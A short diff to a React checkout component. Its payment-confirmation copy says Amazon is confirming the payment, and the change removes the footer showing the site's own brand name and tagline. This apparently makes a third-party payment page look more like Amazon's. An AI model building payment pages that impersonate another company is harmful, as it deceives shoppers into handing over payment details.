@@ -259,7 +259,6 @@ export default function Checkout() {
               {waiting ? 'Processing...' : 'Confirm payment details'}
             </button>
             <div className="alz-helper-copy mt-6">Keep this page open while Amazon confirms your payment details.</div>
-            <div className="alz-footer">{BRAND.name} | {BRAND.tagline}</div>
             <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
           </div>
 
